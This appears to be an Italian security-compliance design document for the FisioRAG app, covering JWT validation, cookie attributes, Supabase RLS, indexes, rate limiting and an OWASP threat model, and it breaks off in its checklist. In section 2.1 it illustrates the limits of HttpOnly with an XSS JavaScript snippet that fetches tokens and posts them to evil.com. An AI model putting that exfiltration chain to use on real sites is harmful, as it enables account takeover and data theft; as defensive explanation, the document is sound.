# Addendum: Security Standards Compliance

**Status**: Active  
**Version**: 1.0  
**Date**: 2025-10-08  
**Applicability**: Tutte le implementazioni security-sensitive del progetto FisioRAG

## Context

Integrazione standard ufficiali (RFC, OWASP, PostgreSQL, Supabase) per garantire robustezza e sicurezza implementazioni authentication/authorization. Materiale consolidato da Story 1.3.1 (Student Token Management System) come reference implementation con pattern applicabili trasversalmente.

**Obiettivo**: Fornire single source of truth per compliance con standard industry-recognized, pattern riutilizzabili, deviazioni giustificate MVP e security audit checklist.

---

## 1. JWT Security Standards (RFC 8725, RFC 7519)

### 1.1 Algoritmo Whitelist (RFC 8725, Sezione 3.1)

**RFC Quote**: "Libraries MUST enable the caller to specify a supported set of algorithms and MUST NOT use any other algorithms"

**Requisito Compliance**:
- Backend DEVE supportare solo `HS256` (simmetrico, chiave condivisa SUPABASE_JWT_SECRET)
- VIETATO accettare `alg: none` senza validazione esplicita
- PyJWT configuration: `algorithms=["HS256"]` parametro obbligatorio in `jwt.decode()`

**Implementazione**:
```python
# apps/api/api/main.py - JWT validation conforme RFC 8725

import jwt
from jwt.exceptions import InvalidTokenError
from fastapi import HTTPException, status

def verify_jwt_token(credentials) -> dict:
    """
    JWT validation conforme RFC 8725 + RFC 7519.
    
    Security Features:
    - Algoritmo whitelist: solo HS256 permesso (RFC 8725 Sezione 3.1)
    - Claims obbligatori: exp, iat (RFC 8725 Sezione 3.1)
    - Clock skew tolerance: ±2 minuti (RFC 7519)
    - Audience validation: EXPECTED_AUD check
    """
    if credentials is None or credentials.scheme.lower() != "bearer":
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Missing Bearer token"
        )
    
    token = credentials.credentials
    
    try:
        payload = jwt.decode(
            token,
            SUPABASE_JWT_SECRET,
            algorithms=["HS256"],  # Whitelist esplicita (RFC 8725)
            audience=EXPECTED_AUD,
            options={
                "require": ["exp", "iat"],  # Claims obbligatori (RFC 8725)
                "leeway": CLOCK_SKEW_LEEWAY_SECONDS  # Clock skew tolerance (RFC 7519)
            }
        )
        return payload
    except InvalidTokenError as e:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=f"Invalid token: {e}"
        ) from e
```

**Security Rationale**: Previene algorithm confusion attacks (attaccante modifica header `alg` per bypassare signature validation).

---

### 1.2 Validazione Claims Temporali (RFC 7519, RFC 8725 Sezione 3.1)

**RFC 7519 Requirements**:
- `exp` (expiration): "The current time MUST be before the time represented by the 'exp' claim"
- `iat` (issued at): tracciamento timestamp generazione token per audit
- `nbf` (not before): opzionale, non implementato MVP

**RFC 8725 Quote**: "JWT libraries SHOULD enable the caller to enforce...the presence of required claims"

**Implementazione**: PyJWT `options={"require": ["exp", "iat"]}`

**Validazione automatica**:
- PyJWT verifica `exp < now()` automaticamente
- Se scaduto: solleva `jwt.ExpiredSignatureError`
- Catch in `InvalidTokenError` → HTTPException 401

---

### 1.3 Clock Skew Handling (RFC 7519)

**RFC 7519 Quote**: "Implementers MAY provide for some small leeway, usually no more than a few minutes, to account for clock skew"

**RFC 9068 Confirmation**: "usually no more than a few minutes"

**Rationale**: Server multi-istanza potrebbero avere orologi leggermente desincronizzati (NTP drift, timezone issues)

**Implementazione Consigliata**:
- Tolleranza ±2 minuti (120 secondi) su validazione `exp` e `nbf`
- PyJWT supporta: `jwt.decode(..., options={"leeway": 120})`

```python
# apps/api/api/main.py - Clock skew configuration

# Environment variable (default: 120 secondi = 2 minuti)
CLOCK_SKEW_LEEWAY_SECONDS = int(os.getenv("CLOCK_SKEW_LEEWAY_SECONDS", "120"))

# Usage in jwt.decode()
payload = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=["HS256"],
    audience=EXPECTED_AUD,
    options={
        "require": ["exp", "iat"],
        "leeway": CLOCK_SKEW_LEEWAY_SECONDS  # ±2 minuti tolleranza
    }
)
```

**Environment Variable**: `CLOCK_SKEW_LEEWAY_SECONDS` (default: 120)

**Trade-off**: Aumenta finestra attacco token scaduto di ~2 minuti, ma previene falsi positivi da clock desync.

---

### 1.4 OAuth 2.0 Error Codes Standard (RFC 6749, Sezione 5.2)

**RFC 6749 Defined Errors**:
- `invalid_grant`: "the provided authorization grant (e.g., authorization code, resource owner credentials) or refresh token is invalid, expired, revoked...or was issued to another client"
- `invalid_request`: parametri request mancanti o malformati
- `invalid_client`: client authentication fallita (non applicabile: nessun client secret nel nostro caso)
- `unauthorized_client`: client non autorizzato per questo grant type
- `unsupported_grant_type`: authorization server non supporta grant type

**Response Format Standard**:
```json
{
  "error": "invalid_grant",
  "error_description": "Refresh token expired"
}
```

**Implementazione Refresh Token Endpoint**:
```python
# apps/api/api/main.py - POST /api/v1/auth/refresh-token

@app.post("/api/v1/auth/refresh-token")
def refresh_access_token(request: Request):
    refresh_token = request.cookies.get("refresh_token")
    
    if not refresh_token:
        # OAuth 2.0 error format
        raise HTTPException(
            status_code=400,
            detail={
                "error": "invalid_request",
                "error_description": "Missing refresh token cookie"
            }
        )
    
    # Verifica DB
    result = supabase.table("refresh_tokens")\
        .select("*")\
        .eq("token", refresh_token)\
        .eq("is_revoked", False)\
        .single()\
        .execute()
    
    if not result.data:
        raise HTTPException(
            status_code=401,
            detail={
                "error": "invalid_grant",
                "error_description": "Refresh token invalid or revoked"
            }
        )
    
    # Check expiration
    expires_at = datetime.fromisoformat(result.data["expires_at"])
    if datetime.now(timezone.utc) >= expires_at:
        raise HTTPException(
            status_code=401,
            detail={
                "error": "invalid_grant",
                "error_description": "Refresh token expired"
            }
        )
    
    # ... genera nuovo access token ...
```

**Applicabilità**: Tutti endpoint OAuth 2.0-like (exchange-code, refresh-token, revoke-token).

---

## 2. Cookie Security Standards (RFC 6265, OWASP)

### 2.1 Attributo HttpOnly (RFC 6265, Sezione 4.1.2.6)

**RFC 6265 Quote**: "instructs the user agent to omit the cookie when providing access to cookies via 'non-HTTP' APIs (such as a web browser API that exposes cookies to scripts)"

**Protezione**: JavaScript non può leggere cookie tramite `document.cookie` → previene XSS-based cookie theft offline

**LIMITAZIONE CRITICA** (OWASP Session Management Cheat Sheet):
> "However, if an XSS attack is combined with a CSRF attack, the requests sent to the web application will include the session cookie, as the browser always includes the cookies when sending requests"

**Implicazione**: HttpOnly protegge solo la **confidenzialità** del cookie (attaccante non può leggerlo per usarlo offline), ma NON impedisce **azioni autenticate on-the-fly** se attaccante usa XSS per inviare richieste tramite `fetch()` o `XMLHttpRequest` con cookie auto-incluso dal browser.

**Esempio Attack Chain XSS-based Authenticated Request**:
```javascript
// Script malevolo iniettato via XSS
// HttpOnly previene: document.cookie (NON ritorna refresh_token)
// HttpOnly NON previene: richieste autenticate on-the-fly

fetch('/api/v1/auth/refresh-token', {
  method: 'POST',
  credentials: 'include'  // Browser invia cookie HttpOnly automaticamente
}).then(res => res.json()).then(data => {
  // Attaccante ottiene nuovo access token in risposta JSON
  // Usa access token per exfiltration dati sensibili
  fetch('/api/v1/admin/student-tokens', {
    headers: {'Authorization': `Bearer ${data.access_token}`}
  }).then(res => res.json()).then(tokens => {
    // Exfiltrate tokens a server attaccante
    fetch('https://evil.com/collect', {
      method: 'POST',
      body: JSON.stringify(tokens)
    });
  });
});
```

**Mitigazione Primaria XSS** (OWASP XSS Prevention Cheat Sheet):
- **Output Encoding context-aware**: "convert untrusted input into a safe form where the input is displayed as data to the user without executing as code"
  - HTML context: HTML Entity Encoding (`< → &lt;`, `> → &gt;`)
  - JavaScript context: JavaScript Encoding (`" → \"`, `' → \'`)
  - URL parameters: URL Encoding (`space → %20`)
- **Framework Protection**: React auto-escapes JSX text content (protezione parziale, NON sufficiente per `dangerouslySetInnerHTML`)
- **Content Security Policy** (Phase 2): header `Content-Security-Policy: script-src 'self'` blocca inline scripts e eval()

---

### 2.2 Attributo Secure (RFC 6265, Sezione 4.1.2.5)

**RFC 6265 Quote**: "limits the scope of the cookie to 'secure' channels...typically HTTP over Transport Layer Security"

**OWASP Requirement**: "mandatory to prevent the disclosure of the session ID through MitM attacks"

**Protezione**: Cookie trasmesso solo su connessioni HTTPS, mai su HTTP plain

**Scenario Attack Prevented**: 
- Attaccante MITM su rete Wi-Fi pubblica non sicura
- Intercetta traffico HTTP
- Cookie senza `Secure` attribute: inviato in chiaro → attaccante lo ruba
- Cookie con `Secure` attribute: NON inviato su HTTP → attaccante non lo vede

**Prerequisito**: Deployment con HTTPS obbligatorio (Traefik reverse proxy con Let's Encrypt, configurato in docker-compose.yml)

---

### 2.3 Attributo SameSite (RFC 6265bis, OWASP CSRF Prevention)

**RFC 6265bis Quote**: "prevents browsers from sending a SameSite flagged cookie with cross-site requests"

**Valore Strict** (OWASP): "prevent the cookie from being sent...in all cross-site browsing context, even when following a regular link"

**Meccanismo**: Browser verifica origin richiesta, se cross-site (es. richiesta da `evil.com` a `fisiorag.com`) → cookie NON inviato

**Previene**: CSRF attacks (attaccante su sito malevolo non può forgiare richieste autenticate)

**LIMITAZIONE Browser Legacy** (OWASP):
- Opera Mini, UC Browser for Android, iOS Safari < 13.2: NON supportano SameSite
- Percentuale utenti impattati: <5% (browser moderni Chrome/Firefox/Edge supportano dal 2020)

**LIMITAZIONE XSS Bypass** (OWASP CSRF Prevention):
> "IMPORTANT: Remember that Cross-Site Scripting (XSS) can defeat all CSRF mitigation techniques"

**Rationale**: Attaccante con XSS può inviare richieste **same-origin** → SameSite non blocca (richiesta origina da stesso sito compromesso)

**Defense in Depth** (OWASP CSRF Prevention):
1. **Primary** (MVP implementato): SameSite=Strict cookie attribute
2. **Secondary** (Phase 2): CSRF token (synchronizer token pattern o double-submit cookie)
3. **Tertiary** (Phase 2): Origin/Referer header validation
4. **Quaternary** (API only): Custom request headers (`X-Requested-With: XMLHttpRequest`)

**Browser Default Moderni**: Chrome, Firefox, Edge usano `SameSite=Lax` come default dal 2020 se attributo non specificato.

**Nota MVP**: SameSite=Strict sufficiente per target audience studenti universitari (browser moderni), CSRF token opzionale per hardening Phase 2.

---

### 2.4 Attributo Path (RFC 6265, Sezione 4.1.2.4)

**RFC 6265 Quote**: "limits the scope of each cookie to a set of paths"

**OWASP Raccomandazione**: "set as restrictive as possible to the web application path"

**Protezione**: Cookie inviato solo a endpoint specifico, non a tutta applicazione

**LIMITAZIONE** (RFC 6265): "any web application can set cookies for any path on that host" → NON è security boundary robusta (altra webapp su stesso host può impostare cookie per path arbitrario)

**Uso**: Defense in depth, riduce cookie leakage a endpoint non correlati

**Esempio**: 
- Refresh token: `path="/api/v1/auth/refresh-token"` → inviato solo a endpoint refresh
- Session cookie: `path="/api/v1"` → inviato a tutte API

---

### 2.5 Cookie Security Implementation (FastAPI)

**FastAPI Cookie Setting** (Starlette base):
```python
from fastapi import Response

@app.post("/api/v1/auth/exchange-code")
def exchange_code(body: ExchangeCodeRequest, response: Response):
    # ... genera refresh token ...
    
    # Set cookie con attributi sicuri (RFC 6265 + OWASP compliant)
    response.set_cookie(
        key="refresh_token",
        value=refresh_token,
        max_age=31536000,  # 1 anno in secondi (sync con DB expires_at)
        httponly=True,     # RFC 6265 4.1.2.6: XSS protection (confidentiality)
        secure=True,       # RFC 6265 4.1.2.5: HTTPS only (MITM protection)
        samesite="strict", # RFC 6265bis: CSRF protection
        path="/api/v1/auth/refresh-token"  # RFC 6265 4.1.2.4: scope limitation
    )
    
    return {"access_token": access_token, "token_type": "bearer", "expires_in": 900}
```

**Parametri Starlette `set_cookie()`** (FastAPI Docs):
- `key`: nome cookie
- `value`: valore cookie
- `max_age`: durata in secondi (alternativa a `expires` timestamp)
- `expires`: timestamp scadenza (alternativa a `max_age`)
- `path`: scope URL path
- `domain`: scope domain (default: current domain)
- `secure`: boolean, richiede HTTPS
- `httponly`: boolean, inaccessibile a JavaScript
- `samesite`: "strict" | "lax" | "none"

---

## 3. Supabase RLS Policy Optimization

### 3.1 SELECT Wrapping per Performance (Supabase Docs, RLS Performance)

**Pattern Consigliato**: `USING ((SELECT auth.jwt() -> 'app_metadata' ->> 'role') = 'admin')`

**Meccanismo**: Wrapping funzione `auth.jwt()` con `SELECT` forza PostgreSQL query optimizer a creare initPlan

**Beneficio**: Risultato funzione cachato **per-statement** invece di chiamata **per-row**

**Miglioramento Misurato** (Supabase Docs, RLS Performance test cases):
- Test case 1: 99.94% improvement (da 1.2s a 0.7ms)
- Test case 2: 94.97% improvement
- Test case 3: 99.993% improvement

**Fonte**: Supabase Documentation "Row Level Security Performance" article

**Implementazione**:
```sql
-- ❌ Pattern NON ottimizzato (chiamata per-row)
CREATE POLICY policy_name ON table_name
FOR ALL
TO authenticated
USING (auth.jwt() -> 'app_metadata' ->> 'role' = 'admin');

-- ✅ Pattern ottimizzato (cachato per-statement)
CREATE POLICY policy_name ON table_name
FOR ALL
TO authenticated
USING ((SELECT auth.jwt() -> 'app_metadata' ->> 'role') = 'admin')
WITH CHECK ((SELECT auth.jwt() -> 'app_metadata' ->> 'role') = 'admin');
```

**Rationale PostgreSQL**: Query optimizer riconosce subquery `SELECT` come initPlan, esegue una volta e riutilizza risultato per tutte righe. Funzione diretta viene chiamata per ogni riga valutata.

**Applicabile a**: Tutte policy RLS che usano funzioni `auth.jwt()`, `auth.uid()`, o custom functions.

---

### 3.2 Indici su Colonne Policy (Supabase Docs)

**Supabase Raccomandazione**: "Add indexes on any columns used within the Policies which are not already indexed"

**Esempio**: Policy con `(select auth.uid()) = user_id` → richiede `CREATE INDEX userid ON table USING btree (user_id)`

**Miglioramento Misurato** (Supabase test case): 99.94% improvement

**Nel Nostro Caso**:
- Policy usano `auth.jwt()` per leggere metadata (NON colonna DB)
- Indice NON applicabile (nessuna colonna referenziata in WHERE policy)
- SELECT wrapping sufficiente per optimization

**Applicabile a**: Policy che filtr su colonne tabella (es. `user_id`, `tenant_id`, `organization_id`)

---

### 3.3 RLS Bypass con service_role_key (Supabase Docs)

**Supabase Documentation Quote**: "A Supabase client with the Authorization header set to the service role API key will ALWAYS bypass RLS"

**Meccanismo**: `service_role_key` corrisponde a ruolo PostgreSQL con privilegio `bypassrls`

**Uso**:
- **Backend FastAPI**: usa `service_role_key` per operazioni admin (ingestion, validation refresh token, revoke cascade)
- **Frontend**: usa `anon_key` pubblica, soggetta a RLS policies

**Implementazione**:
```python
# apps/api/api/main.py - Supabase client initialization

from supabase import create_client, Client

# Backend usa service_role_key (bypassa RLS)
supabase: Client = create_client(
    os.getenv("SUPABASE_URL"),
    os.getenv("SUPABASE_SERVICE_ROLE_KEY")  # Bypassa RLS
)

# Frontend (apps/web) usa anon_key (soggetto a RLS)
# const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
```

**Security Considerations**:
- `service_role_key` DEVE rimanere server-side, mai esposta a frontend
- Frontend comunica con backend FastAPI, che media accesso DB con `service_role_key`
- RLS policies proteggono accesso diretto frontend → DB (se `anon_key` tentasse query dirette)

---

### 3.4 ON DELETE CASCADE con RLS (PostgreSQL Docs, Supabase Troubleshooting)

**PostgreSQL Behavior**: "ON DELETE CASCADE ensures that if a parent record is deleted, all associated child records are automatically removed"

**Con RLS Attivo**: CASCADE operations rispettano policy RLS **a meno che** non vengano eseguite da ruolo con `bypassrls` (es. `service_role_key`)

**Implicazione**: 
- Admin elimina student token → CASCADE revoke su refresh_tokens funziona perché backend usa `service_role_key`
- Se frontend tentasse DELETE diretto con `anon_key` → CASCADE bloccato da RLS

**Fonte**: PostgreSQL Documentation, Supabase RLS Troubleshooting guide

---

## 4. PostgreSQL Index Optimization (PostgreSQL 18, Sezione 11.8)

### 4.1 Indici Parziali (Partial Indexes)

**PostgreSQL 18 Docs Quote** (Sezione 11.8): "A partial index is an index built over a subset of a table; the subset is defined by a conditional expression (called the predicate)"

**Esempio**: `CREATE INDEX idx_name ON table(column) WHERE is_active = TRUE`

**Vantaggi Prestazionali** (PostgreSQL Docs):

1. **Riduzione dimensione indice**: "reduces the size of the index" → indicizza solo subset rilevante (token attivi, refresh token non revocati)

2. **Query speedup**: "will speed up those queries that do use the index" → ricerche su subset più veloci (meno righe da scansionare)

3. **Update speedup**: "will also speed up many table update operations because the index does not need to be updated in all cases"
   - Esempio: soft delete `UPDATE table SET is_active = FALSE` → riga esce da predicato indice → NO update indice necessario
   - Esempio: insert nuovo token attivo → riga entra in predicato → update indice necessario

4. **Evita indicizzare "common values"**: "particularly useful for...avoiding indexing common values" → valori che rappresentano "more than a few percent of all the table rows"
   - Nel nostro caso: token revocati rappresentano >50% righe dopo tempo → inefficiente indicizzarli

---

### 4.2 Query Planner Usage (PostgreSQL Docs)

**PostgreSQL Docs Quote**: "a partial index can be used in a query only if the system can recognize that the WHERE condition of the query mathematically implies the predicate of the index"

**Esempio Compatibile**:
- Indice: `WHERE is_active = TRUE`
- Query: `SELECT * FROM table WHERE token = 'xyz' AND is_active = TRUE`
- Planner: usa indice (WHERE query implica predicato indice)

**LIMITAZIONE** (PostgreSQL Docs): "PostgreSQL does not have a sophisticated theorem prover...otherwise the predicate condition must exactly match part of the query's WHERE condition"

**Implicazione**: Predicato indice deve esattamente matchare filtro query. Query senza filtro `is_active` → NOT usa indice parziale (fallback a sequential scan o indice completo)

**Verifica Query Plan**:
```sql
EXPLAIN ANALYZE
SELECT * FROM student_tokens
WHERE token = 'xyz' AND is_active = TRUE;

-- Output atteso: Index Scan using idx_student_tokens_token
```

---

### 4.3 Trade-off e Best Practices

**Trade-off**:
- **Pro**: Riduzione 50-90% dimensione indice (assumendo 10-50% token attivi), performance insert/update soft delete
- **Contro**: Query su token revocati (`WHERE is_active = FALSE`) NON beneficiano indice (sequential scan, raro, solo audit admin)

**Best Practice Implementation**:
```sql
-- Tabella student_tokens (token attivi query frequenti)
CREATE INDEX idx_student_tokens_token ON student_tokens(token) 
WHERE is_active = TRUE;

CREATE INDEX idx_student_tokens_active_not_expired ON student_tokens(is_active, expires_at) 
WHERE is_active = TRUE;

-- Tabella refresh_tokens (token non revocati query frequenti)
CREATE INDEX idx_refresh_tokens_token ON refresh_tokens(token) 
WHERE is_revoked = FALSE;

CREATE INDEX idx_refresh_tokens_valid ON refresh_tokens(is_revoked, expires_at) 
WHERE is_revoked = FALSE;
```

**Quando NON usare partial indexes**:
- Query su entrambi subset (attivi + revocati) frequentemente
- Distribuzione subset bilanciata (50/50 attivi/revocati)
- Tabelle piccole (<10K righe) dove full table scan è economico

---

## 5. Rate Limiting Strategy (OWASP Authentication Cheat Sheet)

### 5.1 Algoritmi Implementabili

#### Sliding Window (Raccomandato Produzione)

**Meccanismo** (Redis Learn - Sliding Window Rate Limiter):
> "restricts requests for a discrete window prior to the current request under evaluation. As opposed to a fixed window rate limiter which groups the requests into a bucket based on a very definitive time window"

**Implementazione**: Timestamp ogni richiesta salvato, count richieste in finestra mobile `[now - window, now]`

**Vantaggi**: Più accurato del fixed window, previene burst al confine delle finestre temporali

**Storage**: Redis centralizzato (multi-istanza FastAPI dietro load balancer) o in-memory (MVP single-instance)

**Esempio**:
```python
# Sliding window con Redis sorted sets
import time
from redis import Redis

redis_client = Redis()

def check_rate_limit_sliding(user_id: str, limit: int, window_sec: int) -> bool:
    now = time.time()
    window_start = now - window_sec
    key = f"rate_limit:{user_id}"
    
    # Rimuovi richieste fuori finestra
    redis_client.zremrangebyscore(key, 0, window_start)
    
    # Count richieste in finestra
    request_count = redis_client.zcard(key)
    
    if request_count >= limit:
        return False  # Rate limit exceeded
    
    # Aggiungi richiesta corrente
    redis_client.zadd(key, {str(now): now})
    redis_client.expire(key, window_sec)
    
    return True  # Allow request
```

---

#### Token Bucket (Alternativa)

**Meccanismo**: Bucket contiene max N token, ogni richiesta consuma 1 token, token rigenerati a rate fisso

**Vantaggi**: Permette burst brevi controllati (utente può "accumulare" token se non usa servizio), più flessibile

**Contro**: Complessità implementativa maggiore (stato bucket persistente), race conditions multi-thread

**Uso Ideale**: API con pattern burst legittimi (es. batch upload documenti)

---

#### Fixed Window In-Memory (MVP Attuale)

**Implementazione Corrente** (Story 1.3, `exchange-code`):
```python
_rate_limit_store: Dict[str, list[float]] = {}  # IP → [timestamps]

def _enforce_rate_limit(client_ip: str):
    now = time.time()
    window_start = now - RATE_LIMIT_WINDOW_SEC
    
    timestamps = _rate_limit_store.get(client_ip, [])
    timestamps = [t for t in timestamps if t > window_start]  # Pulisci scaduti
    
    if len(timestamps) >= RATE_LIMIT_MAX_REQUESTS:
        raise HTTPException(status_code=429, detail="rate_limited")
    
    timestamps.append(now)
    _rate_limit_store[client_ip] = timestamps
```

**Limitazioni**:
- **Fixed window**: vulnerabile a "burst attack" al confine finestra (attaccante invia 2x limit in <2 sec tra due finestre)
- **In-memory**: non funziona con load balancer multi-istanza (ogni istanza ha contatore separato)
- **Per-IP**: vulnerabile ad attaccanti con IP multipli (botnet, proxy rotation)

**Accettabile per MVP**: Single-instance VPS deployment, rate limiting basic protection

---

### 5.2 Configuration (OWASP Authentication Cheat Sheet)

**OWASP Parametri Raccomandati**:
- **Lockout threshold**: numero tentativi permessi (es. 10 richieste)
- **Observation window**: periodo temporale (es. 60 secondi)
- **Lockout duration**: quanto dura il blocco dopo superamento threshold (es. 300 secondi = 5 minuti)
- **Exponential backoff** (opzionale): "doubles after each failed login attempt" - per admin endpoints critici

**Implementazione tramite Environment Variables**:
```bash
# apps/api/.env
EXCHANGE_CODE_RATE_LIMIT_WINDOW_SEC=60
EXCHANGE_CODE_RATE_LIMIT_MAX_REQUESTS=10

REFRESH_TOKEN_RATE_LIMIT_WINDOW_SEC=3600  # 1 ora
REFRESH_TOKEN_RATE_LIMIT_MAX_REQUESTS=60

ADMIN_CREATE_TOKEN_RATE_LIMIT_WINDOW_SEC=3600
ADMIN_CREATE_TOKEN_RATE_LIMIT_MAX_REQUESTS=10
```

---

### 5.3 Endpoint-Specific Limits

| Endpoint | Limit | Window | Rationale |
|----------|-------|--------|-----------|
| `POST /api/v1/admin/student-tokens` | 10 req | 1 ora | Previene bulk generation abuse da admin account compromesso |
| `POST /api/v1/auth/exchange-code` | 10 req | 60 sec | Previene brute-force token guessing (32 char = 256-bit keyspace) |
| `POST /api/v1/auth/refresh-token` | 60 req | 1 ora | Previene abuse refresh loop, permette refresh ogni ~1 min (normale 15 min) |
| `POST /api/v1/chat/query` | 60 req | 1 min | Previene spam query RAG, controllo costi LLM API (Story 3.1) |

**Calibrazione**: Valori iniziali basati su pattern uso atteso, da monitorare e regolare post-deployment con metriche reali.

---

### 5.4 Improvement Roadmap (Phase 2)

1. **Migrazione Redis**: Sostituire `Dict` in-memory con Redis (chiave: `{endpoint}:{IP}`, TTL automatico)
2. **Sliding Window**: Implementare algoritmo sliding window per maggiore accuratezza
3. **Account-based Limiting**: Limitare per `student_token_id` o `user_id` oltre che per IP (OWASP raccomandazione: "associate the counter of failed login with the account itself, rather than the source IP address")
4. **Distributed Rate Limiting**: Sincronizzazione tra istanze FastAPI dietro load balancer
5. **Monitoring & Alerting**: Dashboard rate limit events, alert su threshold anomali

---

## 6. Security Threat Model (OWASP Top 10)

### 6.1 XSS (Cross-Site Scripting) - Limitazioni HttpOnly

**OWASP XSS Prevention Quote**: XSS permette "account impersonation, observing user behaviour, loading external content, stealing sensitive data"

**HttpOnly Cookie Protection**: Previene lettura cookie via `document.cookie` (confidenzialità protetta)

**LIMITAZIONE CRITICA** (OWASP Session Management):
> "However, if an XSS attack is combined with a CSRF attack, the requests sent to the web application will include the session cookie, as the browser always includes the cookies when sending requests"

**Implicazione**: HttpOnly protegge solo **confidenzialità** del token (attaccante non può rubare per usarlo offline), ma NON impedisce **azioni autenticate on-the-fly** se attaccante usa XSS per inviare richieste tramite `fetch()` con cookie auto-incluso.

**XSS Attack Persistence Scenario**:
1. Attaccante inietta XSS payload in campo user-generated content (es. nome studente, commento chat)
2. Payload eseguito quando admin visualizza dashboard
3. Payload invia richiesta `fetch('/api/v1/auth/refresh-token', {credentials: 'include'})`
4. Browser include cookie HttpOnly automaticamente
5. Attaccante ottiene nuovo access token in response JSON
6. Usa access token per exfiltration dati sensibili

**Mitigazione Primaria XSS** (OWASP XSS Prevention Cheat Sheet):
- **Output Encoding context-aware**: "convert untrusted input into a safe form where the input is displayed as data to the user without executing as code"
  - HTML context: HTML Entity Encoding (`<script> → &lt;script&gt;`)
  - JavaScript context: JavaScript Encoding (`alert('hi') → alert(\'hi\')`)
  - URL params: URL Encoding (`space → %20`)
- **Framework Protection**: React auto-escapes JSX text content (protezione parziale)
  - ✅ Safe: `<div>{userInput}</div>` (auto-escaped)
  - ❌ Unsafe: `<div dangerouslySetInnerHTML={{__html: userInput}} />` (NO escaping)
- **Content Security Policy** (Phase 2): header `Content-Security-Policy: default-src 'self'; script-src 'self'` blocca inline scripts e `eval()`

---

### 6.2 CSRF (Cross-Site Request Forgery) - Limitazioni SameSite

**OWASP CSRF Prevention Quote**: "SameSite is a cookie attribute...which aims to mitigate CSRF attacks"

**SameSite=Strict Mechanism**: "helps the browser decide whether to send cookies along with cross-site requests" → browser verifica origin richiesta, se cross-site blocca cookie

**CSRF Attack Scenario Prevented**:
1. Victim autenticato su `fisiorag.com` (ha cookie refresh_token)
2. Victim visita `evil.com` (sito attaccante)
3. `evil.com` contiene form: `<form action="https://fisiorag.com/api/v1/auth/refresh-token" method="POST">`
4. Form auto-submitted via JavaScript
5. **Senza SameSite**: browser invia cookie → attaccante ottiene access token
6. **Con SameSite=Strict**: browser NON invia cookie (cross-site request) → attacco fallisce

**LIMITAZIONE Browser Legacy** (OWASP):
- Opera Mini, UC Browser for Android, iOS Safari < 13.2: NON supportano SameSite
- Percentage users: <5% (browser moderni Chrome/Firefox/Edge supportano dal 2020)
- Mitigation: CSRF token per browser legacy (Phase 2)

**LIMITAZIONE XSS Bypass** (OWASP CSRF Prevention):
> "IMPORTANT: Remember that Cross-Site Scripting (XSS) can defeat all CSRF mitigation techniques"

**Rationale**: Attaccante con XSS può inviare richieste **same-origin** (script eseguito su `fisiorag.com` compromesso) → SameSite non blocca (richiesta origina da stesso sito)

**Defense in Depth** (OWASP CSRF Prevention):
1. **Primary** (MVP implementato): SameSite=Strict cookie attribute
2. **Secondary** (Phase 2): CSRF token (synchronizer token pattern: token in form hidden field + session, double-submit cookie: token in cookie + request body)
3. **Tertiary** (Phase 2): Origin/Referer header validation (server verifica header `Origin` match expected domain)
4. **Quaternary** (API only): Custom request headers (`X-Requested-With: XMLHttpRequest` - simple requests CSRF non possono impostare header custom)

**Browser Default Moderni**: Chrome 80+, Firefox 69+, Edge 86+ usano `SameSite=Lax` come default se attributo non specificato (previene CSRF su POST, permette GET top-level navigation).

---

### 6.3 Attack Scenarios & Mitigations

| Scenario | Rischio Senza Mitigazione | Mitigazione Implementata (MVP) | Limitazioni Residue |
|----------|---------------------------|--------------------------------|---------------------|
| **XSS Attack (Token Theft Offline)** | JWT rubato da localStorage → accesso perpetuo | Refresh token in HttpOnly cookie → XSS non può leggere | XSS può inviare richieste autenticate on-the-fly (fetch + cookie auto-incluso). **Mitigazione Phase 2**: output encoding + CSP header |
| **XSS Attack (Persistence)** | JWT rubato → attaccante accede offline dopo chiusura pagina | Refresh token `Path=/api/v1/auth/refresh-token` restriction | Attaccante deve mantenere XSS payload attivo per durata sessione victim. **Mitigazione**: output encoding, CSP |
| **Token Rubato (MITM)** | Accesso garantito fino a scadenza token | Access token breve durata 15 min, refresh token revocabile da admin | Access token rubato valido max 15 min. **Mitigazione**: HTTPS obbligatorio (Secure cookie), Traefik SSL termination |
| **CSRF Attack** | Attaccante cross-site forgia richiesta → refresh token → access token | SameSite=Strict blocca cookie in richieste cross-site | Browser legacy (<5% users) vulnerabili. **Mitigazione Phase 2**: CSRF token |
| **Account Compromesso** | Admin non può invalidare JWT long-lived | Admin revoca student token → refresh tokens invalidati (cascade) → sessioni terminate | Revoca non immediata: access token valido fino a scadenza (max 15 min). Gap accettabile per MVP |
| **Insider Threat (DB Access)** | Dipendente infedele copia token studente → accesso perpetuo | Revoca immediata possibile, audit log `last_used_at` rileva anomalie | Dipendente con accesso DB può rubare refresh token direttamente. **Mitigazione**: DB encryption at rest, audit log access DB |
| **Refresh Token Replay** | Attaccante ruba refresh token da rete → replay attack | Token reusable fino a scadenza/revoca (no rotation MVP) | Token valido 1 anno riusabile. **Mitigazione Phase 2**: refresh token rotation (RFC 6749 Sezione 10.4) - new token per ogni uso, invalida precedente |
| **Brute-Force Token Guessing** | Attaccante prova token random fino a match | Rate limiting: 10 req/60 sec su exchange-code | Keyspace 256-bit (32 char base64) → praticamente impossibile brute-force anche senza rate limiting. Defense in depth |

---

## 7. Compliance Checklist

### RFC Compliance

- ✅ **RFC 6749** (OAuth 2.0 Authorization Framework):
  - Refresh token pattern implementato (Sezione 1.5)
  - Error codes standard: `invalid_grant`, `invalid_request` (Sezione 5.2)
  - Refresh token binding: associato a `student_token_id` (Sezione 6)
  - ⚠️ Token rotation: non implementato MVP (Sezione 10.4) - pianificato Phase 2

- ✅ **RFC 7519** (JSON Web Token):
  - Claims validation: `exp`, `iat` con `options={"require": ["exp", "iat"]}`
  - Clock skew handling: leeway ±2 minuti (120 sec)
  - Audience validation: `EXPECTED_AUD` check

- ✅ **RFC 8725** (JWT Best Current Practices):
  - Algoritmo whitelist: `algorithms=["HS256"]` (Sezione 3.1)
  - Required claims: `exp`, `iat` (Sezione 3.1)
  - VIETATO `alg: none` senza validazione esplicita (Sezione 3.2)

- ✅ **RFC 6265** (HTTP State Management Mechanism - Cookies):
  - HttpOnly attribute (Sezione 4.1.2.6)
  - Secure attribute (Sezione 4.1.2.5)
  - Path attribute (Sezione 4.1.2.4)
  
- ✅ **RFC 6265bis** (draft - SameSite Cookie Attribute):
  - SameSite=Strict implementato

---

### OWASP Top 10 Mitigation

- ✅ **A01:2021 - Broken Access Control**:
  - RLS policies admin-only con SELECT wrapping optimization
